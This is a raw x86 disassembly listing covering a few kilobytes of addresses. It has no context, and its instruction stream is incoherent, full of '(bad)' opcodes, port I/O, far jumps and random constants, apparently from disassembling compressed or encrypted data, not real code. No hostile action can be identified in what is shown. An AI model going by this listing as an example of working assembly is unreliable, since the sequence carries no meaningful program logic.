  402f91:	adc    al,BYTE PTR [eax]
  402f93:	jns    0x402f3e
  402f95:	jge    0x402f60
  402f97:	push   ds
  402f98:	jnp    0x402f38
  402f9a:	mov    ecx,DWORD PTR [ebp-0x6c]
  402f9d:	js     0x402f84
  402f9f:	sbb    dh,BYTE PTR [esi]
  402fa1:	cdq    
  402fa2:	cmp    ebx,DWORD PTR [esi+0x3a]
  402fa5:	jns    0x402ff7
  402fa7:	test   al,0xf9
  402fa9:	xor    BYTE PTR [eax],dl
  402fab:	std    
  402fac:	mov    BYTE PTR [esi+0x51],dh
  402faf:	iret   
  402fb0:	in     al,dx
  402fb1:	loope  0x402fa6
  402fb3:	sub    ch,BYTE PTR [eax+edi*4+0xe04358d]
  402fba:	xchg   ebx,eax
  402fbb:	sub    ecx,DWORD PTR ds:0xc5ea6644
  402fc1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  402fc2:	ror    DWORD PTR [ebx+0x59],cl
  402fc5:	xchg   edx,eax
  402fc6:	xchg   esp,eax
  402fc7:	std    
  402fc8:	icebp  
  402fc9:	cmp    BYTE PTR [ecx+ebp*1],dh
  402fcc:	mov    ah,0xcd
  402fce:	push   0xffffff8b
  402fd0:	dec    edx
  402fd1:	je     0x402fc3
  402fd3:	adc    al,0xd8
  402fd5:	adc    eax,0x220a7d05
  402fda:	jno    0x402f87
  402fdc:	add    dh,bl
  402fde:	mov    cl,0x48
  402fe0:	inc    edi
  402fe1:	leave  
  402fe2:	cmp    ecx,ebx
  402fe4:	xlat   BYTE PTR ds:[ebx]
  402fe5:	fadd   QWORD PTR [ebp+eiz*8+0x18]
  402fe9:	mov    ebp,0x57433700
  402fee:	mov    ebp,DWORD PTR [edi-0x72]
  402ff1:	push   cs
  402ff2:	jo     0x402f7a
  402ff4:	mov    ds:0x27cd660e,eax
  402ff9:	loopne 0x403044
  402ffb:	adc    DWORD PTR [eax+0x518c67da],0x52f90acd
  403005:	stos   BYTE PTR es:[edi],al
  403006:	cmp    al,0x6
  403008:	loope  0x403069
  40300a:	sub    BYTE PTR [esi],bh
  40300c:	popa   
  40300d:	push   cs
  40300e:	sub    BYTE PTR [eax+0x7f],dl
  403011:	adc    eax,0x49a93972
  403016:	in     al,dx
  403017:	fst    QWORD PTR [ebx]
  403019:	mov    eax,DWORD PTR [ebp-0x4a7bdcda]
  40301f:	pusha  
  403020:	jg     0x40309c
  403022:	pop    ds
  403023:	jae    0x403043
  403025:	sub    bl,BYTE PTR [ebx+edx*1]
  403028:	fisubr DWORD PTR [ebx+0x25]
  40302b:	or     BYTE PTR [esi+0xb],ch
  40302e:	outs   dx,DWORD PTR ss:[esi]
  403030:	daa    
  403031:	lock out 0x2a,al
  403034:	stc    
  403035:	jle    0x403042
  403037:	xlat   BYTE PTR ds:[ebx]
  403039:	push   esp
  40303a:	js     0x403040
  40303c:	imul   al
  40303e:	add    dh,BYTE PTR [eax+0x3adb1765]
  403044:	dec    ebp
  403045:	mov    esp,0xcb3bedb0
  40304a:	stos   DWORD PTR es:[edi],eax
  40304b:	jno    0x403064
  40304d:	jo     0x40300f
  40304f:	into   
  403050:	std    
  403051:	stos   BYTE PTR es:[edi],al
  403052:	inc    edx
  403053:	fdiv   DWORD PTR ds:0x950f89ab
  403059:	dec    eax
  40305a:	mov    esi,0x91d58679
  40305f:	scas   eax,DWORD PTR es:[edi]
  403060:	mov    ss:0xf1aed985,al
  403066:	enter  0x1b09,0xab
  40306a:	adc    al,dl
  40306c:	mov    ds:0xab8d5937,al
  403071:	(bad)  
  403072:	cwde   
  403073:	cmp    al,0xb6
  403075:	loopne 0x4030a6
  403077:	loopne 0x403063
  403079:	mov    eax,ds:0x868b4c10
  40307e:	push   ss
  40307f:	xchg   DWORD PTR [esi-0x10],edi
  403082:	out    dx,eax
  403083:	ins    DWORD PTR es:[edi],dx
  403084:	rcl    BYTE PTR [edx-0x43],cl
  403087:	mov    ecx,0x376f8ed2
  40308c:	dec    edx
  40308d:	jl     0x40305d
  40308f:	std    
  403090:	adc    BYTE PTR [edx],ah
  403092:	repz mov ebx,0x27f8901
  403098:	sub    eax,0xf7c37ca7
  40309d:	icebp  
  40309e:	loope  0x403116
  4030a0:	aaa    
  4030a1:	in     eax,dx
  4030a2:	fist   WORD PTR [eax]
  4030a4:	dec    edx
  4030a5:	stos   DWORD PTR es:[edi],eax
  4030a6:	xlat   BYTE PTR ds:[ebx]
  4030a7:	call   0x99c4:0x7874b489
  4030ae:	repz leave 
  4030b0:	mov    al,ds:0x443b7a43
  4030b5:	inc    esp
  4030b6:	f2xm1  
  4030b8:	xchg   edi,eax
  4030b9:	lds    eax,FWORD PTR [ecx+0x4a17cc0d]
  4030bf:	inc    ecx
  4030c0:	mov    ebp,0xb9f25a99
  4030c5:	stc    
  4030c6:	push   edi
  4030c7:	or     eax,0x363f00c4
  4030cc:	inc    eax
  4030cd:	mov    esp,0x3c731cac
  4030d2:	and    DWORD PTR ds:0xafa4315,ecx
  4030d8:	inc    eax
  4030d9:	push   ds
  4030da:	arpl   WORD PTR es:[edx],dx
  4030dd:	xchg   DWORD PTR [edi+esi*4-0xf],edx
  4030e1:	or     al,0xa8
  4030e3:	(bad)  
  4030e5:	in     eax,dx
  4030e6:	push   esp
  4030e7:	mov    ebx,0xcd13b7b1
  4030ec:	xor    DWORD PTR [esi-0x33845eb5],ebx
  4030f2:	mov    dl,0xbb
  4030f4:	fiadd  DWORD PTR [edx+0x46]
  4030f7:	push   ebx
  4030f8:	stc    
  4030f9:	leave  
  4030fa:	add    al,0xf0
  4030fc:	popf   
  4030fd:	test   al,0x5e
  4030ff:	sub    eax,0x95e929e8
  403104:	ins    DWORD PTR es:[edi],dx
  403105:	add    DWORD PTR [esi-0xebdfd70],ebx
  40310b:	gs aam 0x13
  40310e:	xlat   BYTE PTR ds:[ebx]
  40310f:	dec    BYTE PTR cs:[edx+0x58]
  403113:	pop    es
  403114:	pop    es
  403115:	or     DWORD PTR [bx],edx
  403118:	pop    es
  403119:	pop    ebx
  40311a:	adc    al,0xaf
  40311c:	mov    esp,0x75b68238
  403122:	jle    0x403198
  403124:	cmp    al,0x60
  403126:	push   ebx
  403127:	out    dx,al
  403128:	sbb    eax,0x3b6a80fd
  40312d:	add    eax,0xffffff8b
  403130:	rcr    DWORD PTR [ecx+0x6d],cl
  403133:	icebp  
  403134:	cmp    cl,BYTE PTR [ecx-0x1b]
  403137:	js     0x403197
  403139:	or     DWORD PTR [ebp+0x4d],0xda70e39d
  403140:	xor    al,0x6e
  403142:	call   0xda90:0x77fe5273
  403149:	mov    ecx,0xa1df8b28
  40314e:	mov    DWORD PTR [eax],esp
  403150:	inc    edi
  403151:	inc    ecx
  403152:	add    ecx,DWORD PTR [ecx+0x25]
  403155:	inc    esp
  403156:	in     eax,dx
  403157:	sahf   
  403158:	xchg   esi,eax
  403159:	cli    
  40315a:	jmp    0xb816:0x5b23885f
  403161:	mov    es,esp
  403163:	and    bl,BYTE PTR [ecx+0x59]
  403166:	das    
  403167:	out    dx,eax
  403168:	les    esi,FWORD PTR [ebx+0x6e]
  40316b:	ds fucomi st,st(3)
  40316e:	ficomp DWORD PTR [esi]
  403170:	(bad)  [ecx]
  403172:	mov    cl,BYTE PTR [eax+0x4e16ba7b]
  403178:	jg     0x40314f
  40317a:	adc    BYTE PTR ds:0x55531792,ah
  403180:	shr    bh,cl
  403182:	lods   al,BYTE PTR ds:[esi]
  403183:	fild   WORD PTR [edx-0x3c]
  403186:	cmc    
  403187:	fild   DWORD PTR [edi+0xb]
  40318a:	cmp    esi,DWORD PTR [eax+ecx*8-0x62]
  40318e:	pop    esp
  40318f:	push   esp
  403190:	fcmove st,st(3)
  403192:	aas    
  403193:	in     eax,dx
  403194:	mov    edi,0x47cef6a2
  403199:	jns    0x403149
  40319b:	jne    0x403208
  40319d:	clc    
  40319e:	or     DWORD PTR [esi+0x7],ebp
  4031a1:	mov    BYTE PTR [esi+0x4c810a4c],dl
  4031a7:	call   0x8780:0x428577aa
  4031ae:	add    BYTE PTR [edx],bh
  4031b0:	das    
  4031b1:	mul    DWORD PTR [edi]
  4031b3:	cld    
  4031b4:	or     edi,DWORD PTR [edi]
  4031b6:	dec    eax
  4031b7:	mov    dl,0x73
  4031b9:	mov    edi,0x3f2b3101
  4031be:	stos   DWORD PTR es:[edi],eax
  4031bf:	sar    DWORD PTR [esp+edi*2-0x16],1
  4031c3:	and    dh,BYTE PTR [ebx+0x2a5012f6]
  4031c9:	push   edi
  4031ca:	(bad)  [esi]
  4031cc:	push   DWORD PTR [eax]
  4031ce:	fidiv  DWORD PTR [ebx+0x6746c5f7]
  4031d4:	mov    bl,0xab
  4031d6:	in     al,dx
  4031d7:	adc    al,0x4
  4031d9:	pop    eax
  4031da:	inc    ebp
  4031db:	cmp    al,0x91
  4031dd:	xchg   DWORD PTR [edx+0x9],ebx
  4031e0:	mov    bl,0xcc
  4031e2:	pop    edi
  4031e3:	adc    al,0x2c
  4031e5:	xlat   BYTE PTR ds:[ebx]
  4031e6:	sub    DWORD PTR [esi+0xf],eax
  4031e9:	mov    ch,ah
  4031eb:	dec    esp
  4031ec:	or     al,0xea
  4031ee:	dec    edi
  4031ef:	in     eax,0x7
  4031f1:	or     DWORD PTR [edi],0x49f8e0e8
  4031f7:	lods   al,BYTE PTR cs:[esi]
  4031f9:	inc    esp
  4031fa:	inc    ecx
  4031fb:	lea    ebx,[ecx]
  4031fd:	inc    esp
  4031fe:	push   cs
  4031ff:	jb     0x4031c5
  403201:	jae    0x403232
  403203:	adc    al,0xd7
  403205:	imul   eax,DWORD PTR [ecx+0x58],0x15
  403209:	mov    bl,0x92
  40320b:	jle    0x403196
  40320d:	mov    bh,0x6a
  40320f:	push   ebp
  403210:	and    BYTE PTR [esi],bl
  403212:	jmp    0xc90eecc8
  403217:	mov    ch,0x9f
  403219:	jge    0x4031b5
  40321b:	sub    cl,bl
  40321d:	or     eax,0xc6b6003f
  403222:	scas   eax,DWORD PTR es:[edi]
  403223:	jne    0x4031b2
  403225:	inc    eax
  403226:	mov    ch,0x6f
  403228:	in     eax,0x34
  40322a:	jo     0x4031db
  40322c:	fwait
  40322d:	mov    ch,0x3c
  40322f:	fst    DWORD PTR [esi+0x3d]
  403232:	repnz mov al,0x3f
  403235:	pop    ebp
  403236:	fisub  WORD PTR [edi]
  403238:	push   ecx
  403239:	fsub   DWORD PTR [edi-0x32]
  40323c:	idiv   DWORD PTR [esi]
  40323e:	or     dh,BYTE PTR [ecx+eax*4+0x1a734411]
  403245:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403246:	or     al,0x90
  403248:	sbb    eax,DWORD PTR [eax+0x5a]
  40324b:	(bad)  
  40324c:	mov    al,0xb5
  40324e:	icebp  
  40324f:	and    DWORD PTR [edi+edx*4-0x45bf44c6],esi
  403256:	not    bl
  403258:	ds (bad) 
  40325a:	fsub   DWORD PTR [edi+0x524ef455]
  403260:	cld    
  403261:	into   
  403262:	jp     0x403252
  403264:	adc    bl,dl
  403266:	sbb    DWORD PTR ds:0x11aa62b4,0xb7368326
  403270:	xor    eax,0x81a507dc
  403275:	icebp  
  403276:	or     eax,0x152e742c
  40327b:	je     0x40326c
  40327d:	mov    eax,0x1203b555
  403282:	jg     0x40326e
  403284:	mov    bl,0xb2
  403286:	enter  0xc647,0x66
  40328a:	js     0x403258
  40328c:	fisub  WORD PTR [ebp-0x543b2605]
  403292:	sub    ecx,DWORD PTR [ecx]
  403294:	dec    edx
  403295:	pop    esp
  403296:	call   0xaf15555e
  40329b:	(bad)  
  40329c:	cli    
  40329d:	test   eax,0x424855b2
  4032a2:	fbld   TBYTE PTR [edi+0x35174f2b]
  4032a8:	icebp  
  4032a9:	(bad)  
  4032aa:	push   esi
  4032ab:	add    eax,0xec3d47c0
  4032b0:	inc    esp
  4032b1:	addr16 pop ds
  4032b3:	(bad)
  4032b6:	(bad)  
  4032b7:	jmp    0x4032e4
  4032b9:	adc    eax,0xc2deedf4
  4032be:	dec    esi
  4032bf:	xor    BYTE PTR [ebp-0x6f4d097f],dl
  4032c5:	aam    0x25
  4032c7:	add    DWORD PTR [edx-0x6539b336],eax
  4032cd:	out    dx,al
  4032ce:	fcom   st(0)
  4032d0:	pop    esp
  4032d1:	aaa    
  4032d2:	scas   al,BYTE PTR es:[edi]
  4032d3:	imul   esi,DWORD PTR [ebx],0xffffff90
  4032d6:	test   al,0x6d
  4032d8:	stc    
  4032d9:	jno    0x40333e
  4032db:	lea    esp,[ebp+0x566cfe80]
  4032e1:	pop    ebx
  4032e2:	pop    edi
  4032e3:	fsub   st(3),st
  4032e5:	adc    DWORD PTR [ecx+0x348b924e],edi
  4032eb:	pop    esp
  4032ec:	adc    eax,0x2a21076b
  4032f1:	rol    DWORD PTR fs:[ebx-0x597f621d],cl
  4032f8:	xlat   BYTE PTR ds:[ebx]
  4032f9:	popf   
  4032fa:	xor    DWORD PTR [ecx-0x7a9e2da0],ebx
  403300:	daa    
  403301:	shl    al,cl
  403303:	push   esp
  403304:	sbb    DWORD PTR [eax-0x6f],ecx
  403307:	jp     0x4032a9
  403309:	push   ebp
  40330a:	cdq    
  40330b:	mov    ebp,0xaf082146
  403310:	int3   
  403311:	mov    ecx,0x2cd3ded2
  403316:	cmp    BYTE PTR [esi-0x44],cl
  403319:	scas   al,BYTE PTR es:[edi]
  40331a:	ja     0x4032a6
  40331c:	cmp    edi,DWORD PTR [edi]
  40331e:	xor    eax,0x430b2bb1
  403323:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  403324:	ror    dh,cl
  403326:	stc    
  403327:	fld    QWORD PTR [ebp-0x6d]
  40332a:	xchg   edi,eax
  40332b:	rcl    DWORD PTR [ecx+0x73832be],1
  403331:	cli    
  403332:	lahf   
  403333:	ret    0x2056
  403336:	sbb    DWORD PTR [edx-0x48a2447d],esp
  40333c:	jno    0x403351
  40333e:	inc    esp
  40333f:	mov    edi,0x77d08ebc
  403344:	gs popa 
  403346:	mov    esp,0x7074d1c5
  40334b:	pusha  
  40334c:	dec    edi
  40334d:	test   edx,ecx
  40334f:	sahf   
  403350:	pop    ss
  403351:	scas   eax,DWORD PTR es:[edi]
  403352:	icebp  
  403353:	pop    edi
  403354:	addr16 jo 0x40334d
  403357:	pop    ecx
  403358:	xlat   BYTE PTR ds:[bx]
  40335a:	jecxz  0x4033cc
  40335c:	and    eax,0x49ff0a1b
  403361:	rol    BYTE PTR [ebx+0x4448060f],1
  403367:	cdq    
  403368:	push   edi
  403369:	xor    eax,DWORD PTR es:[ecx+0x21]
  40336d:	lea    esp,[ebx+0x38]
  403370:	mov    WORD PTR [ebp-0x25],ds
  403373:	pop    esp
  403374:	fdiv   st(5),st
  403376:	fdiv   DWORD PTR [ebp+0x3c]
  403379:	inc    ebx
  40337a:	imul   esp,DWORD PTR [ebx-0x6a0744],0xffffffd5
  403381:	fisttp QWORD PTR [edi+ebp*1+0x14c4d614]
  403388:	rcr    DWORD PTR [ebx+edi*4-0x589c836d],1
  40338f:	push   ss
  403390:	cs iret 
  403392:	std    
  403393:	sbb    dl,bl
  403395:	push   edi
  403396:	sub    eax,0x294b27e4
  40339b:	inc    ebx
  40339c:	adc    eax,0xbd3b5e75
  4033a1:	push   esi
  4033a2:	push   ebx
  4033a3:	pop    ds
  4033a4:	adc    DWORD PTR [edi+0x19],esp
  4033a7:	adc    DWORD PTR [esi],edi
  4033a9:	retf   0xbcee
  4033ac:	sub    DWORD PTR [ebp+esi*2-0x73],ebx
  4033b0:	jge    0x403340
  4033b2:	mov    al,ds:0xf473626e
  4033b7:	sti    
  4033b8:	das    
  4033b9:	mov    edx,0xc82b096c
  4033be:	pop    esi
  4033bf:	mov    edi,0xc5862b40
  4033c4:	popa   
  4033c5:	retf   
  4033c6:	or     ecx,esp
  4033c8:	jp     0x4033c8
  4033ca:	test   DWORD PTR [eax-0x70],eax
  4033cd:	inc    ecx
  4033ce:	or     ebp,ecx
  4033d0:	or     eax,0xb371484
  4033d5:	test   al,0x9c
  4033d7:	mov    al,ds:0xb92d2681
  4033dc:	in     eax,0xfd
  4033de:	xchg   ebx,eax
  4033df:	sahf   
  4033e0:	push   edx
  4033e1:	ja     0x40338f
  4033e3:	inc    esi
  4033e4:	pop    edi
  4033e5:	fsubr  st(4),st
  4033e7:	call   0x48357163
  4033ec:	mov    ah,0x13
  4033ee:	sub    al,0x23
  4033f0:	cmp    eax,0xa057c9a7
  4033f5:	cmp    edi,esi
  4033f7:	adc    dl,BYTE PTR [ebx-0x1103adb3]
  4033fd:	cmp    dl,BYTE PTR [eax+0x4a2d4bfb]
  403403:	xor    edx,DWORD PTR [ebx-0x8]
  403406:	xor    esp,DWORD PTR [edi+eax*8-0x2]
  40340a:	rcl    BYTE PTR [ecx],0x58
  40340d:	mov    eax,ds:0xc214a5e8
  403412:	pop    esi
  403413:	dec    ebx
  403414:	xchg   esp,edi
  403416:	xchg   ebp,eax
  403417:	push   esi
  403418:	fild   DWORD PTR [edx+0xf860567]
  40341e:	shr    DWORD PTR [esi-0x64],1
  403421:	fadd   st(3),st
  403423:	call   0x594a315b
  403428:	shr    al,cl
  40342a:	arpl   WORD PTR cs:[ebp+ecx*1-0x3af3ed0a],bp
  403432:	fcomp  st(5)
  403434:	xchg   ebx,eax
  403435:	add    eax,0xe2e155fc
  40343a:	mov    ecx,0x74638b3a
  40343f:	mov    ds:0xf41409b1,al
  403444:	cmp    eax,DWORD PTR [ebx-0xe]
  403447:	daa    
  403448:	push   ebx
  403449:	(bad)  
  40344a:	mov    ch,0x1d
  40344c:	enter  0xb2e0,0x3c
  403450:	lea    edi,[eax+eax*2-0x19]
  403454:	ins    BYTE PTR es:[edi],dx
  403455:	pop    esi
  403456:	pushf  
  403457:	(bad)  
  403458:	test   al,0xfb
  40345a:	shl    al,cl
  40345c:	mov    WORD PTR ds:0xc0e28dae,ss
  403462:	loope  0x403425
  403464:	std    
  403465:	bound  ebx,QWORD PTR [edx]
  403467:	or     esi,DWORD PTR [eax+0x17]
  40346a:	sahf   
  40346b:	sub    BYTE PTR fs:[eax+0x129f87c9],0xa9
  403473:	in     eax,0x66
  403475:	or     al,0x6
  403477:	adc    edi,ecx
  403479:	cs leave 
  40347b:	imul   ebx,DWORD PTR [ecx-0x30786cbb],0x2e
  403482:	out    dx,al
  403483:	(bad)  [esi]
  403485:	jo     0x4034b3
  403487:	xor    bh,ch
  403489:	cmp    edx,DWORD PTR [edi+0x8b665e0]
  40348f:	push   0x5f
  403491:	add    DWORD PTR [eax-0xc],edx
  403494:	in     al,dx
  403495:	pop    ebp
  403496:	sub    eax,0xf91aac2e
  40349b:	mov    esi,0x68a2487c
  4034a0:	push   esi
  4034a1:	xchg   esp,eax
  4034a2:	jnp    0x4034c7
  4034a4:	nop
  4034a5:	jmp    0x2634:0x85080f33
  4034ac:	dec    esi
  4034ad:	imul   ebp,DWORD PTR [edi-0x7cab0c96],0x22
  4034b4:	out    dx,al
  4034b5:	dec    eax
  4034b6:	inc    edx
  4034b7:	cmc    
  4034b8:	or     eax,0x8bb5129f
  4034bd:	cmc    
  4034be:	or     DWORD PTR [ecx+edx*2],esi
  4034c1:	pop    ebx
  4034c2:	fimul  DWORD PTR [edx+0x3fed3a8b]
  4034c8:	jmp    0x6d8e:0xc56aa11b
  4034cf:	int3   
  4034d0:	dec    ebx
  4034d1:	push   edi
  4034d2:	pop    edx
  4034d3:	and    eax,DWORD PTR [edi-0x70]
  4034d6:	rcl    eax,1
  4034d8:	pop    ecx
  4034d9:	fwait
  4034da:	ss aam 0xa3
  4034dd:	lods   al,BYTE PTR ds:[esi]
  4034de:	xor    BYTE PTR [eax-0x61],ch
  4034e1:	mov    esp,0xd592dbf2
  4034e6:	fild   WORD PTR [eax+0x42]
  4034e9:	imul   ebx,ebp,0xffffff93
  4034ec:	dec    edi
  4034ed:	pushf  
  4034ee:	rcr    DWORD PTR [edi+ecx*8-0x6e997b99],1
  4034f5:	dec    edi
  4034f6:	xor    al,0xdd
  4034f8:	push   ebx
  4034f9:	test   dh,dh
  4034fb:	xchg   ebx,eax
  4034fc:	cdq    
  4034fd:	xor    eax,0x8918cb94
  403502:	mov    ds:0xb4340d6,eax
  403507:	push   0x1c2f7e
  40350c:	mov    cs,edi
  40350e:	add    DWORD PTR [esi+eiz*1+0x20f3cca8],edi
  403515:	cmp    ebp,0xffffffcd
  403518:	inc    ebp
  403519:	mov    edi,0x9d432e55
  40351e:	and    BYTE PTR cs:[esi-0x1678d9c0],cl
  403525:	imul   edi,edx,0x8c1b2e42
  40352b:	or     bl,cl
  40352d:	mov    ch,0xe5
  40352f:	or     BYTE PTR ds:0xc89c054b,0xb
  403536:	fwait
  403537:	jg     0x403585
  403539:	test   WORD PTR [ecx],sp
  40353c:	or     BYTE PTR [ebp+0x1b14f33a],bh
  403542:	mov    ebp,0xe1328e5e
  403547:	cmc    
  403548:	sbb    eax,0x7a6b1155
  40354d:	jmp    0x403576
  40354f:	ins    BYTE PTR es:[edi],dx
  403550:	xlat   BYTE PTR ds:[ebx]
  403551:	icebp  
  403552:	and    eax,0x6c79e8ac
  403557:	ins    BYTE PTR es:[edi],dx
  403558:	es dec eax
  40355a:	and    al,0xc7
  40355c:	call   0x33fc1040
  403561:	push   es
  403562:	lea    edi,[ebx]
  403564:	xchg   edi,eax
  403565:	je     0x403569
  403567:	mov    cl,0x6e
  403569:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40356a:	dec    esi
  40356b:	in     eax,0xad
  40356d:	test   bl,dl
  40356f:	stc    
  403570:	push   cs
  403571:	cmp    bl,BYTE PTR [ebp+edi*1+0x78991132]
  403578:	xchg   BYTE PTR [eax+0x6c],dh
  40357b:	in     al,dx
  40357c:	mov    esi,fs
  40357e:	cli    
  40357f:	nop
  403580:	push   cs
  403581:	imul   esi,DWORD PTR [edi-0x1c],0xfffffff1
  403585:	mov    bh,0x5f
  403587:	rol    BYTE PTR [eax-0x4e68a137],0x8c
  40358e:	mov    bl,0x30
  403590:	fistp  WORD PTR [eax-0xf]
  403593:	ret    
  403594:	xor    al,0x5f
  403596:	cmp    al,0x7a
  403598:	popa   
  403599:	lahf   
  40359a:	mov    ebx,0x654c6bdc
  40359f:	inc    eax
  4035a0:	xchg   ecx,eax
  4035a1:	sbb    BYTE PTR [esi+0x70],bh
  4035a4:	mov    ds:0x12b1fa9,eax
  4035a9:	pop    ebp
  4035aa:	xchg   ecx,eax
  4035ab:	mov    eax,0xbec8339
  4035b0:	sub    DWORD PTR [esp+ebx*8+0x74],edx
  4035b4:	cwde   
  4035b5:	icebp  
  4035b6:	lock movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4035b8:	lods   eax,DWORD PTR ds:[esi]
  4035b9:	clc    
  4035ba:	aad    0x35
  4035bc:	aas    
  4035bd:	adc    al,0xb4
  4035bf:	adc    ebp,DWORD PTR [ecx+0x1b]
  4035c2:	loope  0x4035e2
  4035c4:	iret   
  4035c5:	outs   dx,BYTE PTR ds:[esi]
  4035c6:	push   0x226c9a72
  4035cb:	fistp  DWORD PTR [ebp+0x28117b02]
  4035d1:	les    edx,FWORD PTR [edi-0x6c3d0a01]
  4035d7:	mov    eax,0x18e76139
  4035dc:	into   
  4035dd:	hlt    
  4035de:	jmp    0x4035eb
  4035e0:	jnp    0x40363c
  4035e2:	lock inc esi
  4035e4:	ret    0x35c
  4035e7:	test   BYTE PTR [edx+0x42],0xf8
  4035eb:	sbb    DWORD PTR [eax],0xffffffce
  4035ee:	inc    ebp
  4035ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4035f0:	dec    eax
  4035f1:	xor    dl,BYTE PTR [edx+0x790aa80d]
  4035f7:	shl    esi,0xbc
  4035fa:	xor    esp,DWORD PTR [esi+0x6c]
  4035fd:	or     DWORD PTR [edi],edi
  4035ff:	es out 0x6,al
  403602:	and    ch,BYTE PTR [ebp-0x4bd12f0b]
  403608:	mov    WORD PTR [ebx],cs
  40360a:	and    eax,0x99800bd
  40360f:	mov    al,0xd
  403611:	clc    
  403612:	sub    eax,0xd74814f1
  403617:	inc    ebp
  403618:	pushf  
  403619:	imul   ebp,ebx,0xe2b7ce04
  40361f:	out    dx,al
  403620:	push   ebp
  403621:	gs dec esp
  403623:	jo     0x4035bb
  403625:	push   esp
  403626:	dec    esi
  403627:	int    0x53
  403629:	lock outs dx,BYTE PTR ds:[esi]
  40362b:	fwait
  40362c:	in     eax,dx
  40362d:	imul   DWORD PTR [esi+0x2ef1ac4e]
  403633:	pop    ss
  403634:	ja     0x4035ee
  403636:	mov    ch,0x70
  403638:	push   ss
  403639:	iret   
  40363a:	mov    al,0xc3
  40363c:	xchg   esp,eax
  40363d:	push   0xffffffea
  40363f:	and    DWORD PTR [eax],ebp
  403641:	mov    ch,0x63
  403643:	sbb    BYTE PTR [ecx-0x35],cl
  403646:	icebp  
  403647:	arpl   ax,sp
  403649:	cmp    BYTE PTR [eax-0x68277ea4],cl
  40364f:	jmp    0x784b:0xaaa6558d
  403656:	jno    0x4036be
  403658:	mov    ds:0xaf63699f,eax
  40365d:	push   ds
  40365e:	test   al,0xc2
  403660:	cld    
  403661:	jbe    0x4036e2
  403663:	cdq    
  403664:	mov    ecx,0xb489f851
  403669:	lea    ecx,[esi]
  40366b:	aam    0xc3
  40366d:	out    dx,al
  40366e:	xchg   DWORD PTR [edi],edi
  403670:	ds inc edi
  403672:	xor    ch,BYTE PTR [ebp-0x2444639e]
  403678:	loopne 0x4036c7
  40367a:	inc    eax
  40367b:	outs   dx,BYTE PTR ds:[esi]
  40367c:	dec    edx
  40367d:	mov    edx,0x6b16e74
  403682:	nop
  403683:	xchg   edi,eax
  403684:	ror    DWORD PTR [edi],0x93
  403687:	fcmovb st,st(1)
  403689:	fsubr  st,st(6)
  40368b:	fcom   st(7)
  40368d:	fdiv   QWORD PTR [ecx-0x2214905a]
  403693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403694:	int    0xfd
  403696:	ret    0x50c6
  403699:	xor    ecx,DWORD PTR [edi+0x5ca71bb9]
  40369f:	sub    ah,bl
  4036a1:	sub    bh,BYTE PTR [ebp*2-0x7df02b1f]
  4036a8:	jbe    0x403639
  4036aa:	mov    al,0x5c
  4036ac:	cdq    
  4036ad:	hlt    
  4036ae:	clc    
  4036af:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4036b0:	mov    esi,0x5a7dcec8
  4036b5:	jb     0x4036e5
  4036b7:	stc    
  4036b8:	fistp  QWORD PTR [ebp+0x56]
  4036bb:	imul   ebx,DWORD PTR [ecx],0x73139900
  4036c1:	pop    edx
  4036c2:	arpl   WORD PTR [eax+0x40],di
  4036c5:	adc    eax,0xaf6d0253
  4036ca:	mov    ch,0xd3
  4036cc:	out    0x38,eax
  4036ce:	repnz xchg ebp,eax
  4036d0:	sbb    BYTE PTR [eax+0x11],bh
  4036d3:	jecxz  0x403657
  4036d5:	cwde   
  4036d6:	mov    ah,BYTE PTR [ecx-0x3f]
  4036d9:	inc    edi
  4036da:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4036db:	daa    
  4036dc:	cmp    edi,ebp
  4036de:	sub    BYTE PTR [ecx],dl
  4036e0:	add    eax,0xddee70b6
  4036e5:	jae    0x4036ec
  4036e7:	pop    ebp
  4036e8:	iret   
  4036e9:	push   ebx
  4036ea:	call   0x770b2832
  4036ef:	mov    ?,WORD PTR [esi+0x40]
  4036f2:	js     0x4036fa
  4036f4:	stc    
  4036f5:	or     BYTE PTR [esi+0x78],ch
  4036f8:	ss jno 0x40370b
  4036fb:	mov    BYTE PTR [ecx],0xdc
  4036fe:	xor    eax,DWORD PTR [esi]
  403700:	iret   
  403701:	in     al,dx
  403702:	into   
  403703:	mov    eax,esp
  403705:	pop    es
  403706:	adc    al,0xe6
  403708:	test   DWORD PTR [edi-0xd],edi
  40370b:	nop
  40370c:	and    BYTE PTR [edx+0x2c522625],dh
  403712:	xor    eax,0xd97e7233
  403717:	loope  0x403791
  403719:	mov    edx,0x4757db9
  40371e:	xor    ebp,ecx
  403720:	push   cs
  403721:	dec    ebp
  403722:	and    esp,DWORD PTR [ecx-0x15]
  403725:	xchg   ebp,eax
  403726:	add    edi,ebx
  403728:	dec    esi
  403729:	cli    
  40372a:	or     al,0x2
  40372c:	outs   dx,DWORD PTR ds:[esi]
  40372d:	test   ch,dl
  40372f:	shl    DWORD PTR [ebp+edi*4+0xb5659e6],cl
  403736:	lds    ecx,FWORD PTR [ebx]
  403738:	inc    eax
  403739:	xlat   BYTE PTR ds:[ebx]
  40373a:	jo     0x4036bd
  40373c:	std    
  40373d:	jecxz  0x403742
  40373f:	push   ebp
  403740:	in     al,dx
  403741:	sub    BYTE PTR [eax+0x5c],dl
  403744:	inc    ecx
  403745:	leave  
  403746:	dec    edx
  403747:	xchg   DWORD PTR [edi+0x4c261255],ebp
  40374d:	adc    esi,DWORD PTR ds:0x6ccce766
  403753:	add    cl,BYTE PTR [esi]
  403755:	loope  0x40371a
  403757:	cmp    dl,BYTE PTR [esi-0x8]
  40375a:	jb     0x403784
  40375c:	aas    
  40375d:	adc    eax,DWORD PTR [eax+0x62]
  403760:	ffree  st(0)
  403762:	loop   0x403789
  403764:	inc    ebp
  403765:	dec    edi
  403766:	dec    edi
  403767:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403768:	cmp    BYTE PTR [ecx],dh
  40376a:	cmp    eax,0x3dd2bb0
  40376f:	or     al,0x90
  403771:	inc    edx
  403772:	sar    ah,0x99
  403775:	mov    ah,0x3
  403777:	ret    0xb483
  40377a:	push   ss
  40377b:	and    ebp,esi
  40377d:	inc    ecx
